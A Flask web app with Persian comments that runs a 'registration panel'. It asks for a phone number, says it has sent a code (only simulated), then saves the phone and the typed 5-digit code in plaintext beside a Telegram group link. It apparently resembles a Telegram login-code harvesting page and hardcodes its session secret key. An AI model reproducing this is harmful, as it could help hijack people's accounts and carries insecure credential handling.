"""
پنل ثبت‌نام - بدون Telethon، فقط REST API
"""

import os
import json
import time
import requests
from flask import Flask, render_template, request, jsonify, session

app = Flask(__name__)
app.secret_key = 'mew_secret_key_2026'

# ========== تنظیمات ==========
USERS_FILE = 'users.json'

# ========== مدیریت فایل‌ها ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_user_count():
    users = load_users()
    return len(users)

# ========== مسیرها ==========
@app.route('/')
def index():
    return render_template('register.html', user_count=get_user_count())

@app.route('/api/users/count')
def users_count():
    return jsonify({'count': get_user_count()})

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone', '').strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit():
        return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
    
    try:
        # ذخیره شماره در سشن
        session['phone'] = phone
        session['step'] = 'code'
        
        # در اینجا باید کد رو به شماره کاربر بفرستی
        # از API های خارجی مثل SMS.ir یا پیامک استفاده کن
        
        return jsonify({'success': True, 'message': f'✅ کد تایید به {phone} ارسال شد! (شبیه‌سازی)'})
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    code = request.form.get('code', '').strip()
    phone = session.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'message': '❌ شماره پیدا نشد! دوباره تلاش کنید.'})
    
    if not code.isdigit() or len(code) != 5:
        return jsonify({'success': False, 'message': '❌ کد باید ۵ رقم باشد!'})
    
    try:
        # ذخیره اطلاعات کاربر (بدون تایید واقعی)
        users = load_users()
        user_id = str(int(time.time()))
        
        users[user_id] = {
            'phone': phone,
            'code': code,
            'status': 'pending',
            'registered_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'username': f'user_{user_id}',
            'first_name': 'کاربر',
            'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
        }
        save_users(users)
        
        session.clear()
        
        return jsonify({
            'success': True,
            'message': f'✅ ثبت‌نام موفق!',
            'user': {
                'name': 'کاربر',
                'username': f'user_{user_id}',
                'phone': phone
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

# ========== اجرا ==========
if __name__ == "__main__":
    os.makedirs('templates', exist_ok=True)
    app.run(host='0.0.0.0', port=10000, debug=False, threaded=True)
